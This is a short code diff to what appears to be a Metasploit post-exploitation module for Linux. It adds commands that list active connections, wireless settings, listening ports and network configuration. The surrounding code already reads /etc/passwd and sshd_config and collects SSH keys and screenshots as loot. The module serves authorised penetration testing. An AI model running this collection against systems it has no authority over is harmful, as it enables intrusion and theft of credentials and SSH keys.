@@ -60,7 +60,7 @@ class Metasploit3 < Msf::Post
 
 		users = execute("/bin/cat /etc/passwd | cut -d : -f 1")
 		nconfig = execute("/sbin/ifconfig -a")
-		routes = execute("/sbin/route")
+		routes = execute("/sbin/route -e")
 		mount = execute("/bin/mount -l")
 		iptables = execute("/sbin/iptables -L")
 		iptables_nat = execute("/sbin/iptables -L -t nat")
@@ -69,7 +69,11 @@ class Metasploit3 < Msf::Post
 		sshd_conf = cat_file("/etc/ssh/sshd_config")
 		hosts = cat_file("/etc/hosts")
 		pwd = cat_file("/etc/passwd")
-
+		connections = execute("/usr/bin/lsof -nPi")
+		wireless = execute("/sbin/iwconfig")
+		open_ports = execute("/bin/netstat -tulpn")
+		updown = execute("ls -R /etc/network")		
+		
 		screenshot = get_screenshot
 		ssh_keys = get_ssh_keys
 		installed_pkg = get_packages(distro[:distro])
@@ -91,6 +95,11 @@ class Metasploit3 < Msf::Post
 		save("SSH keys", ssh_keys) unless ssh_keys.empty?
 		save("Linux Installed Packages", installed_pkg)
 		save("Linux Configured Services", installed_svc)
+		save("Active connections", connections)
+		save("Wireless information", wireless)
+		save("Listening ports", open_ports)
+		save("If-Up/If-Down", updown)
+		
 
 	end
 
